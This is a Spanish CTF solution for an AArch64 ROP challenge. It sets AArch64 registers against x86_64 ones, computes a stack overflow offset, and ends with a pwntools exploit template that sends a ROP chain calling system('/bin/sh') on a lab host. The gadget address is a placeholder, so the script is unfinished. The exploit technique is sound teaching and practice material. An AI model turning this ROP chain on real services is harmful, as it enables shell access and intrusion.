# Solución — pwn-aarch64-rop

## Arquitectura AArch64 — diferencias clave vs x86_64

| x86_64 | AArch64 | Descripción |
|--------|---------|-------------|
| rdi | x0 | 1er argumento |
| rsi | x1 | 2do argumento |
| rdx | x2 | 3er argumento |
| rsp | sp | stack pointer |
| ret addr en stack | x30 (lr) | link register en frame |
| gadget `pop rdi; ret` | `ldr x0, [sp, #N]; ldp x29, x30, [sp, #M]; ret` | cargar arg |

## Overflow
- Buffer `password` es de 64 bytes
- `read(0, password, 512)` → overflow de 448 bytes
- Offset al saved x30: `username(32) + password(64) + saved_x29(8)` = 104 bytes

## ROP chain AArch64

### Paso 1: Leak de libc (estático en este caso → no necesario)
El binario es **estático** (`-static`), por lo que libc está en el binario.
Buscar `system` y `/bin/sh` con:
```bash
aarch64-linux-gnu-strings -a ./vuln | grep /bin/sh
aarch64-linux-gnu-nm ./vuln | grep system
```

### Paso 2: Gadget para x0 = addr_of_binsh
```bash
ROPgadget --binary ./vuln --arch aarch64 | grep "ldr x0"
# Buscar: ldr x0, [sp, #N]; ... ldp x29, x30, [sp, #M]; ret
```

### Paso 3: Exploit
```python
from pwn import *

HOST = '172.30.5.30'
PORT = 9998
context.arch = 'aarch64'

elf = ELF('./vuln')
p = remote(HOST, PORT)

OFFSET = 104  # bytes hasta saved x30

# En binario estático: system y /bin/sh están en el binario
system_addr = elf.symbols['system']
binsh_addr  = next(elf.search(b'/bin/sh\x00'))

# Gadget: ldr x0, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret
# (encontrar con ROPgadget)
GADGET_LDR_X0 = 0x...  # ajustar según build

payload  = b'A' * OFFSET           # padding hasta saved x30
payload += p64(GADGET_LDR_X0)      # gadget que carga x0 y hace ret
payload += p64(0xdeadbeef)         # x29 (dummy)
payload += p64(system_addr)        # x30 → siguiente ret
payload += p64(0x0)                # padding [sp+0x10] si el gadget lo necesita
# el gadget pone [sp+0x10] en x0 → ponemos binsh_addr ahí
# ajustar según el offset exacto del gadget

p.sendlineafter(b'Username: ', b'admin')
p.sendlineafter(b'Password: ', payload)
p.interactive()
```

## Herramientas
- `ROPgadget --binary ./vuln --arch aarch64`
- `gdb-multiarch ./vuln` con `set architecture aarch64`
- `pwndbg` con soporte AArch64
- Para testear localmente: `qemu-aarch64-static ./vuln`
